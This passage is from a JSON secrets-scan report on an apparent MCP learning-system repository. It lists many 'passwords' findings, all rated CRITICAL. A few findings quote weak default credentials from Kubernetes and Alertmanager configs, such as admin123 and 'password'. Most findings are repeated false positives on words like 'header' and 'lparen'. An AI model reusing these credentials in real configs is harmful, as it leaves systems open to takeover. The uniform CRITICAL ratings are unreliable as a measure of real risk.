            "context": "n-password: YWRtaW4xMjM=  # admin123\n  prometheus-password: cHJvbWV0aGV1czEyMw==  # prometheus123\n  alertmanager-password: YWxlcnR"
          },
          {
            "file": "k8s/mcp-monitoring.yaml",
            "type": "passwords",
            "line": 474,
            "severity": "CRITICAL",
            "context": "vbWV0aGV1czEyMw==  # prometheus123\n  alertmanager-password: YWxlcnRtYW5hZ2VyMTIz  # alertmanager123\n\n---\n# NetworkPolicy for monit"
          },
          {
            "file": "monitoring/alertmanager.yml",
            "type": "passwords",
            "line": 98,
            "severity": "CRITICAL",
            "context": "username: 'alertmanager@example.com'\n        auth_password: 'password'\n        headers:\n          Subject: '[{{ .Status "
          },
          {
            "file": "monitoring/alertmanager.yml",
            "type": "passwords",
            "line": 131,
            "severity": "CRITICAL",
            "context": "username: 'alertmanager@example.com'\n        auth_password: 'password'\n        headers:\n          Subject: '[MEMORY] {{ "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 109638,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'SSSSSS'\",\n          \"line_number\": 107,\n          \"line_r"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110159,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'access_token'\",\n          \"line_number\": 28,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110179,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'refresh_token'\",\n          \"line_number\": 30,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110199,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'header'\",\n          \"line_number\": 24,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110246,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'header'\",\n          \"line_number\": 81,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110298,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'header'\",\n          \"line_number\": 70,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110354,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'header'\",\n          \"line_number\": 218,\n          \"line_r"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110409,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'header'\",\n          \"line_number\": 32,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110459,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'header'\",\n          \"line_number\": 91,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110514,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'access_token'\",\n          \"line_number\": 50,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110534,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'refresh_token'\",\n          \"line_number\": 52,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110694,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n          \"line_number\": 89,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110714,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'header'\",\n          \"line_number\": 92,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110738,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'header'\",\n          \"line_number\": 53,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110820,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'client_secret_basic'\",\n          \"line_number\": 77,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110860,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n          \"line_number\": 19,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110880,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n          \"line_number\": 13,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110900,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'header'\",\n          \"line_number\": 17,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110955,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n          \"line_number\": 32,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110975,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'client_secret_basic'\",\n          \"line_number\": 67,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 110995,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n          \"line_number\": 7,\n          \"line_ran"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 139151,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: '[-!#$%&'*+.^_`|~0-9a-zA-Z]+'\",\n          \"line_number\": 17"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 139681,
            "severity": "CRITICAL",
            "context": "    assert auth is not None\\n75         username, password = auth\\n\",\n          \"col_offset\": 8,\n          \"end_col_of"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 140041,
            "severity": "CRITICAL",
            "context": "    assert auth is not None\\n75         username, password = auth\\n\",\n          \"col_offset\": 8,\n          \"end_col_of"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 140281,
            "severity": "CRITICAL",
            "context": "},\n        {\n          \"code\": \"295     username, password = value\\n296     if password == \\\"-\\\":  # pragma: no cover\\n29"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 140281,
            "severity": "CRITICAL",
            "context": "ssword == \\\"-\\\":  # pragma: no cover\\n297         password = click.prompt(\\\"Password\\\", hide_input=True)\\n\",\n          \"col_of"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 140891,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'environment'\",\n          \"line_number\": 1440,\n          \"line_"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 141422,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'keyword'\",\n          \"line_number\": 639,\n          \"line_r"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 141462,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: '#bygroup'\",\n          \"line_number\": 765,\n          \"line_r"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 141702,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'lbracket'\",\n          \"line_number\": 784,\n          \"line_r"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 141722,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'lparen'\",\n          \"line_number\": 788,\n          \"line_r"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 141782,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'lparen'\",\n          \"line_number\": 803,\n          \"line_r"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 172930,
            "severity": "CRITICAL",
            "context": "er.add_password(realm=None, uri=proxy, user=user, passwd=password)\\n1208         opener.add_handler(ProxyBasicAuthHandler("
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 173091,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'OTEL_EXPORTER_JAEGER_PASSWORD'\",\n          \"line_number\": 238,\n          \"line_r"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 222738,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'struct'\",\n          \"line_number\": 478,\n          \"line_r"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 225433,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: '[^\\\\W\\\\d]\\\\w*'\",\n          \"line_number\": 17,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 225501,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: '(?=\\\\s|#|[)\\\\]]|$)'\",\n          \"line_number\": 3041,\n          \"line_"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 225521,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: '[A-Z]\\\\w*'\",\n          \"line_number\": 334,\n          \"line_r"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 268181,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'access_token'\",\n          \"line_number\": 28,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 268201,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'refresh_token'\",\n          \"line_number\": 30,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 268221,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'header'\",\n          \"line_number\": 24,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 268268,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'header'\",\n          \"line_number\": 81,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 268320,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'header'\",\n          \"line_number\": 70,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 268376,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'header'\",\n          \"line_number\": 218,\n          \"line_r"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 268431,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'header'\",\n          \"line_number\": 32,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 268481,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'header'\",\n          \"line_number\": 91,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 268536,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'access_token'\",\n          \"line_number\": 50,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 268556,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'refresh_token'\",\n          \"line_number\": 52,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 268716,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n          \"line_number\": 89,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 268736,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'header'\",\n          \"line_number\": 92,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 268760,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'header'\",\n          \"line_number\": 53,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 268842,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'client_secret_basic'\",\n          \"line_number\": 77,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 268882,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n          \"line_number\": 19,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 268902,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n          \"line_number\": 13,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 268922,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'header'\",\n          \"line_number\": 17,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 268977,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n          \"line_number\": 32,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 268997,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'client_secret_basic'\",\n          \"line_number\": 67,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 269017,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'bearer'\",\n          \"line_number\": 7,\n          \"line_ran"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 294239,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: '[-!#$%&'*+.^_`|~0-9a-zA-Z]+'\",\n          \"line_number\": 17"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 294769,
            "severity": "CRITICAL",
            "context": "    assert auth is not None\\n75         username, password = auth\\n\",\n          \"col_offset\": 8,\n          \"end_col_of"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 295129,
            "severity": "CRITICAL",
            "context": "    assert auth is not None\\n75         username, password = auth\\n\",\n          \"col_offset\": 8,\n          \"end_col_of"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 295369,
            "severity": "CRITICAL",
            "context": "},\n        {\n          \"code\": \"295     username, password = value\\n296     if password == \\\"-\\\":  # pragma: no cover\\n29"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 295369,
            "severity": "CRITICAL",
            "context": "ssword == \\\"-\\\":  # pragma: no cover\\n297         password = click.prompt(\\\"Password\\\", hide_input=True)\\n\",\n          \"col_of"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 295959,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'environment'\",\n          \"line_number\": 1440,\n          \"line_"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 296490,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'keyword'\",\n          \"line_number\": 639,\n          \"line_r"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 296530,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: '#bygroup'\",\n          \"line_number\": 765,\n          \"line_r"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 296770,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'lbracket'\",\n          \"line_number\": 784,\n          \"line_r"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 296790,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'lparen'\",\n          \"line_number\": 788,\n          \"line_r"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 296850,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'lparen'\",\n          \"line_number\": 803,\n          \"line_r"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 327367,
            "severity": "CRITICAL",
            "context": "er.add_password(realm=None, uri=proxy, user=user, passwd=password)\\n1208         opener.add_handler(ProxyBasicAuthHandler("
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 327528,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'OTEL_EXPORTER_JAEGER_PASSWORD'\",\n          \"line_number\": 238,\n          \"line_r"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 377155,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: 'struct'\",\n          \"line_number\": 478,\n          \"line_r"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 379850,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: '[^\\\\W\\\\d]\\\\w*'\",\n          \"line_number\": 17,\n          \"line_ra"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 379918,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: '(?=\\\\s|#|[)\\\\]]|$)'\",\n          \"line_number\": 3041,\n          \"line_"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 379938,
            "severity": "CRITICAL",
            "context": "LOW\",\n          \"issue_text\": \"Possible hardcoded password: '[A-Z]\\\\w*'\",\n          \"line_number\": 334,\n          \"line_r"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450666,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'SSSSSS'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450722,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'access_token'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450729,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'refresh_token'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450736,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'header'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450743,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'header'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450750,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'header'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450757,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'header'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450764,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'header'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450771,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'header'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450778,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'access_token'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450785,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'refresh_token'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450792,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'bearer'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450799,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'header'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450806,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'header'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450813,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'client_secret_basic'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450827,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'bearer'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450834,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'bearer'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450841,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'header'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450848,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'bearer'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450855,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'client_secret_basic'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450862,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'bearer'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450869,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: '[-!#$%&'*+.^_`|~0-9a-zA-Z]+'\\\",\",\n          \"severity\": \"h"
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450876,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'environment'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450883,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'keyword'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450890,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: '#bygroup'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450918,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'lbracket'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450925,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'lparen'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450946,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'lparen'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 450981,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'OTEL_EXPORTER_JAEGER_PASSWORD'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
            "file": "mcp_learning_system/comprehensive_security_analysis_report.json",
            "type": "passwords",
            "line": 451044,
            "severity": "CRITICAL",
            "context": " \"context\": \"\\\"issue_text\\\": \\\"Possible hardcoded password: 'struct'\\\",\",\n          \"severity\": \"high\"\n        },\n    "
          },
          {
